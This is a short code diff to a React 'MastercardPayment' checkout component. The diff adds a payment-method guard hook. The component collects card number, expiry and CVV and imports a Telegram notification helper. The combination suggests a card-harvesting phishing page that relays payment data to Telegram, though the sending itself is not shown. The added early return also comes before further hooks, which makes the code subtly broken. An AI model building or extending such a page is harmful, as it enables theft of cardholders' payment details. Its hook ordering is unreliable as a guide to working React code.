@@ -1,6 +1,7 @@
 import { useState, useRef, useEffect, useCallback } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { CreditCard, Lock, ArrowLeft, Camera, X } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import mastercardLogo from "@/assets/mastercard-logo.png";
@@ -9,6 +10,8 @@ const MastercardPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const checking = usePaymentMethodGuard("mastercard");
+  if (checking) return null;
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
